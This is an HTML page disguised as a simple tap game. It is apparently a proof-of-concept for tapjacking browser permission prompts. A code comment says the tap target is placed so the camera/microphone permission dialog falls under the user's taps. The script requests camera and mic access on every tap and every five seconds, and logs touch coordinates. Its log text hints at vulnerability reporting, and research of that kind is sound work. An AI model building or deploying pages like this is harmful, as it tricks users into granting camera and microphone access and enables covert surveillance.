<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Tap Game</title>
<style>
  body { margin: 0; font-family: sans-serif; background: #111; color: #fff; touch-action: manipulation; }
  #target {
    /* Shifted right-down so the bottom-center permission dialog
       lands on the tap path */
    position: fixed; top: 45%; left: 58%; transform: translate(-50%, -50%);
    width: 70vw; height: 70vw; max-width: 320px; max-height: 320px;
    border-radius: 50%; background: #3a7;
    display: flex; align-items: center; justify-content: center;
    font-size: 22px; user-select: none;
  }
  #score { position: fixed; top: 10px; left: 10px; font-size: 20px; }
  #log { position: fixed; bottom: 5px; left: 5px; font-size: 11px; color: #888; }
</style>
</head>
<body>
<div id="target">TAP ME</div>
<div id="score">Score: 0</div>
<div id="log"></div>

<script>
let score = 0;
let attempts = 0;
const target = document.getElementById('target');
const log = document.getElementById('log');

async function askPerm() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    stream.getTracks().forEach(t => t.stop());
    log.textContent = 'ALLOWED WITHOUT EXPLICIT TAP — REPORT THIS';
  } catch (e) {
    log.textContent = 'denied/suppressed: ' + e.name;
  }
}

target.addEventListener('touchstart', () => {
  score++;
  document.getElementById('score').textContent = 'Score: ' + score;
  askPerm();
}, { passive: true });

document.addEventListener('touchstart', e => {
  console.log('touch at', e.touches[0].clientX, e.touches[0].clientY,
              'on', e.target.tagName);
}, { passive: true, capture: true });

setInterval(() => {
  if (document.hasFocus()) {
    attempts++;
    console.log(`attempt #${attempts}`);
    askPerm();
  }
}, 5000);
</script>
</body>
</html>
